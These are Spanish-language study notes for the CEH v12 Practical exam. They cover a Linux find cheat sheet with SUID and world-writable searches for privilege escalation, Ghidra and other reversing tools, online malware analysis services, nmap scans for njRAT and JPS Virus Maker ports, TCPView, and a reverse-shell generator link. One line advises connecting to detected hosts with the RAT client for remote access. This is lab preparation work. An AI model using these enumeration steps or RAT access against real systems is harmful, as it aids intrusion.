5. **Backup plans**: Tener múltiples enfoques para cada objetivo

Esta guía cubre las herramientas esenciales del CEH v12 Practical con ejemplos reales de output y cuándo usar cada una en el entorno del examen.
Aquí tienes un Cheat Sheet de find en formato Markdown para copiar y pegar, incluyendo ejemplos claros, explicación de los comandos, escenarios de uso y recomendaciones para entorno CEH Practical (usualmente en Parrot OS):

***

# Linux find Cheat Sheet (CEH Practical)

## Uso Básico

```bash
find [ruta] [opciones] [expresión]
```

## Búsqueda por nombre o patrón

```bash
find . -name flag1.txt
```
_Busca el archivo “flag1.txt” en el directorio actual y subdirectorios._

```bash
find /home -name flag1.txt
```
_Busca “flag1.txt” dentro de /home._

```bash
find . -name "*.log"
```
_Todos los archivos que terminan en .log desde la carpeta actual._

```bash
find / -type d -name config
```
_Encuentra directorios llamados “config” bajo todo el sistema (requiere root para evitar “Permission denied”)._

***

## Búsqueda por permisos

```bash
find / -type f -perm 0777
```
_Archivos con permisos 777 (acceso total a cualquier usuario)._

```bash
find / -perm a=x
```
_Todos los archivos ejecutables por cualquier usuario._

```bash
find / -perm /u=s -type f 2>/dev/null
```
_Archivos con el bit SUID. SUID permite ejecutar como el propietario del archivo (clave en escalado de privilegios - típico del CEH Practical)._

```bash
find / -perm /g=s
```
_Archivos con el bit SGID (ejecuta como el grupo propietario)._

```bash
find / -perm -o w -type d 2>/dev/null
```
_Directorios mundialmente escribibles (potencialmente vulnerables)._

***

## Búsqueda por usuario/propietario

```bash
find /home -user frank
```
_Archivos en /home propiedad del usuario frank._

```bash
find / -group developers
```
_Archivos o directorios del grupo “developers”._

***

## Búsqueda por fecha y hora

```bash
find / -mtime -10
```
_Modificados en los últimos 10 días._

```bash
find / -atime -10
```
_Accedidos en los últimos 10 días._

```bash
find / -cmin -60
```
_Modificados en la última hora._

```bash
find / -amin -60
```
_Accesados en la última hora._

***

## Búsqueda por tamaño

```bash
find / -size 50M
```
_Archivos exactamente de 50 MB._

```bash
find / -size +100M
```
_Archivos mayores a 100 MB._

```bash
find / -size -1M
```
_Archivos menores a 1 MB._

***

## Búsqueda combinada y filtros avanzados

```bash
find / -type f -name "*.sh" -o -name "*.txt"
```
_Archivos .sh o .txt_

```bash
find / -writable -type d 2>/dev/null
```
_Directorios mundialmente escribibles._

```bash
find . -type d -empty
```
_Directorios vacíos._

***

## Acciones sobre los resultados

```bash
find . -type f -name "*.bak" -delete
```
_Elimina archivos .bak encontrados._

```bash
find /tmp -type f -name "*.log" -exec rm {} \;
```
_Ejecuta el comando `rm` sobre cada archivo .log en /tmp._

***

## Consejos y contexto CEH Practical

- Usar `2>/dev/null` para evitar mensajes de “Permission denied”.
- Los comandos find se lanzan siempre desde **Parrot OS** en terminal.
- La búsqueda de SUID, SGID, archivos “777” o mundialmente escribibles es común para escalado de privilegios y análisis de riesgo.
- El uso de find suele preceder al uso de scripts o explotación (p. ej., encontrar scripts modificables, binarios SUID, contraseñas en archivos .txt/.conf, etc).
- Si buscas binarios tipo gcc, python, perl para técnicas de privesc, usa:
  ```bash
  find / -name gcc*
  find / -name python*
  find / -name perl*
  ```

***

**¡Recuerda!** El output de find suele ser largo en CTFs/labs. Usa `| less` o `grep` para filtrar resultados rápidamente, ejemplo:

```bash
find / -type f -name "*.conf" 2>/dev/null | grep 'passwd'
```

***

Fuentes y referencias:  
- [Linux Audit - Find Cheat Sheet](https://linux-audit.com/cheat-sheets/find/)  
- Prácticas CEH v12

  ##### ANALISIS DE EJECUTABLES - DECOMPILAR -   EJECUTABLES

# Ghidra: Localizar y Leer PT_LOAD(0)

## 1. Abrir el binario en Ghidra
1. Inicia Ghidra y crea/proyecto nuevo.  
2. Importa `Strange_File-1` desde la ruta correspondiente.  
3. En el diálogo de importación, confirma el uso de **ELF Loader**.

## 2. Navegar a Program Tree
- Ve a **Window → Program Tree** para mostrar la vista de árbol de secciones.

## 3. Expandir Program Headers
- En **Program Tree**, expande la carpeta **Program Headers**.  
- Aquí aparecen todos los segmentos ELF, incluidos `PT_LOAD[0]`, `PT_LOAD[1]`, etc.

## 4. Seleccionar PT_LOAD[0]
1. Haz clic en la entrada **PT_LOAD[0]**.  
2. Fíjate en el panel central (Listing) donde se muestran sus detalles.

## 5. Leer el tamaño (p_filesz)
- En la tabla de propiedades de PT_LOAD[0], localiza el campo **`p_filesz`**.  
- Ese valor (en bytes) es el tamaño del segmento.

## 6. Ejemplo visual  
```
Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSz MemSz  Flg Align
  LOAD           0x000000 0x00400000 0x00400000 0x0e1c 0x0e1c R E 0x1000  ← PT_LOAD
```
- **FileSz (p_filesz)** = `0x0e1c` (3612 bytes)
***
---

**Nota:** PT_LOAD siempre es el primer “LOAD” en Program Headers. El campo FileSz/P_Filesz es el que debes anotar para cualquier cálculo adicional de hash o análisis.```
***

# 🛠️ Herramientas de Reversing y Debugging – Selección Óptima

## 🔍 Análisis Estático
- 🦅 **Ghidra**  
  • Ideal para: ELF, PE, Mach-O  
  • Uso: Explorar Program Headers, decompilar funciones, strings, cross-references  
  • Preguntas típicas: tamaño de segmentos, lógica de funciones, extracción de strings  
- 🧩 **IDA Pro**  
  • Ideal para: malware ofuscado, PE avanzado  
  • Uso: Vista PE, plugins Hex-Rays, scripts IDC/Python  
  • Preguntas típicas: detección de packers, decrypt routines, anti-debug tricks  

## 🐛 Depuración Dinámica
- 🐍 **OllyDbg**  
  • Ideal para: Windows x86  
  • Uso: breakpoints, patching en vivo, inspección de registros/memoria  
  • Preguntas típicas: bypass de login, análisis de flujo en runtime, API calls
## 🐛 DIE (Detect It Easy)

> sirve para analizar archivos ELF

## ⚖️ Resumen de Casos de Uso

| 🔖 Caso de Pregunta                             | ⚙️ Herramienta     |
|-------------------------------------------------|--------------------|
| Obtener `p_filesz` en PT_LOAD(0)                | Ghidra             |
| Extraer estructuras de PE / secciones           | IDA Pro            |
| Decompilar para entender lógica                 | Ghidra / IDA Pro   |
| Detectar y desempaquetar malware ofuscado       | IDA Pro            |
| Leer cadenas y referencias rápidamente          | Ghidra             |
| Depuración y patching en tiempo real            | OllyDbg            |
| Bypass dinámico de checks/licencias             | OllyDbg            |

---
***

> **Tip:** Elige **Ghidra** para análisis estático profundo, **IDA Pro** para reversing profesional complejo y **OllyDbg** para debugging interactivo en tiempo real.```
---
#### ANALISIS DE MALWARE

# 🦠 Análisis de Malware Online: VirusTotal vs. Hybrid Analysis

## 🌐 VirusTotal
- 🔍 **¿Qué ofrece?**  
  - Escaneo de hashes y archivos contra más de 70 AVs.  
  - Reporte de detecciones, YARA rules, metadatos (PE imports, certificates).  
- ❓ **Preguntas en examen:**  
  - “¿Cómo comprobar rápidamente si un archivo es malicioso?”  
  - “¿Cómo obtener indicadores de compromiso (IoCs) de un hash?”  
- ✅ **Usar cuando:**  
  - Necesites un veredicto rápido de antivirus múltiples.  
  - Quieras buscar dominios/IP relacionados o URL de distribución.  
  - Requieras metadatos básicos (firmas digitales, secciones PE).

## ⚙️ Hybrid Analysis
- 🛠️ **¿Qué ofrece?**  
  - Sandbox dinámico Windows y Linux (comportamiento en ejecución).  
  - Captura de tráfico de red, filesystem, snapshots de memoria.  
  - Reports detallados de API calls, strings, procesos hijos.  
- ❓ **Preguntas en examen:**  
  - “¿Cómo analizar comportamiento de un malware en ejecución?”  
  - “¿Cómo obtener trazas de red y filesystem para un sample?”  
- ✅ **Usar cuando:**  
  - Necesites análisis dinámico para ver payloads, C2 callbacks.  
  - Quieras detallar acciones del malware (registro de APIs, creación de procesos).  
  - Busques capturas de red (PCAP) o screenshots de ejecución.

---
***
## 📊 Comparativa Rápida

| Característica          | VirusTotal        | Hybrid Analysis     |
|-------------------------|-------------------|---------------------|
| Tipo de análisis        | Estático          | Dinámico + Estático |
| AV engines              | ≥ 70              | Integrado (Menos)   |
| Sandbox en ejecución    | No                | Sí                  |
| Tráfico de red (PCAP)   | No                | Sí                  |
| API calls & filesystem  | Limitado          | Completo            |
| IoCs & metadatos        | Excelente         | Bueno               |

---

> **Tip:** Empieza con **VirusTotal** para confirmar rápidamente detección y metadatos. Luego, usa **Hybrid Analysis** para profundizar en el comportamiento dinámico y extraer IoCs avanzados.```

RATS (Remote acces trojans)

# Apuntes: njRAT y JPS Virus Maker en CEH Practical Exam

---

## 🐍 njRAT

- 🟢 **Puerto predeterminado:** 5552  
- 🔍 **Servicio relacionado:** El servicio típico funciona en puerto TCP 5552 y es usado para comunicación cliente-servidor entre el RAT y el controlador.  
- 🔎 **Escanear red para njRAT:**  
```

nmap -p 5552 -sV 10.10.55.0/24 --open

```
Busca hosts con puerto TCP 5552 abierto que sugieran presencia del RAT njRAT.

---

## 🦠 JPS Virus Maker

- 🟢 **Puerto predeterminado:** 4000 TCP  
- 🔍 **Servicio relacionado:** El malware generado por JPS Virus Maker suele usar el puerto 4000 para comunicación remota.  
- 🔎 **Escanear red para JPS:**  
```

nmap -p 4000 -sV 10.10.55.0/24 --open

```
Detecta hosts con servicio activo en puerto 4000.

---

## 👨‍💻 Uso en práctica CEH

- Accede a la carpeta 6 → Malware Analysis → Trojan Types → Remote Access Trojan (RAT) → elegir njRAT.  
- Confirma y escanea la red en búsqueda de puerto 5552.  
- Para JPS Virus Maker, escanea puerto 4000.  
- Una vez identificado equipo, conéctate usando cliente RAT para acceder remotamente.

---

## ✨ Tips y notas

- Para escaneo avanzado y detección, usar también análisis de tráfico con Wireshark y detectar tráfico en estos puertos.  
- Monitorizar conexiones persistentes en esos puertos para detectar actividad RAT.  
- En caso de práctica, probar acceso con cliente njRAT/JPS al host que responde en el puerto correspondiente.

```
# 🌐 Apuntes: Uso de TCPView en Análisis Dinámico de Malware

## 🛠️ ¿Qué es TCPView?
- Herramienta de Sysinternals para Windows.
- Permite visualizar todos los endpoints (puertos) TCP y UDP abiertos, escuchando o con conexiones establecidas.
- Muestra el proceso asociado a cada conexión o puerto.

---

## ⚡ Ventajas para análisis dinámico
- Útil para monitorear procesos sospechosos tras ejecutar malware en un entorno controlado.
- Permite identificar nuevos puertos abiertos por el malware.
- Ayuda a detectar conexiones salientes (C2, descarga de payloads, filtrado de datos).
- Puedes cerrar conexiones manualmente desde la aplicación.

---

## 👀 ¿Cómo usarlo?
1. Ejecuta el malware en laboratorio (sandbox/VM).
2. Abre TCPView y observa los procesos y puertos activos.
3. Fíjate en nuevos procesos o puertos en estado *LISTENING* o *ESTABLISHED*.
4. Revisa direcciones locales/remotas asociadas a procesos sospechosos.
5. Si detectas una comunicación relevante, usa Wireshark para analizar tráfico.

---

## 🚩 Preguntas que puedes resolver con TCPView
- ¿Qué puertos ha abierto el malware tras ejecutarse?
- ¿Qué procesos están escuchando conexiones externas?
- ¿Qué IPs remotas se están contactando desde la máquina víctima?
- ¿Qué procesos mantienen conexiones persistentes tras la infección?
- ¿Se ha levantado algún servicio tipo backdoor al ejecutar el binario? (LISTENING en puertos altos o inusuales)

---

## 🔔 Detección práctica
- **Si ves un proceso nuevo escuchando en un puerto extraño tras ejecutar malware, es sospechoso.**
- **Si detectas conexiones establecidas con IPs públicas, podrías estar ante un C2.**
- Comprueba frecuentemente tras cada ejecución o reinicio.

---

> **Tip:** Complementa TCPView con Process Explorer y Wireshark para un análisis de malware más profundo.

### REVERSE SHELL

https://www.revshells.com/
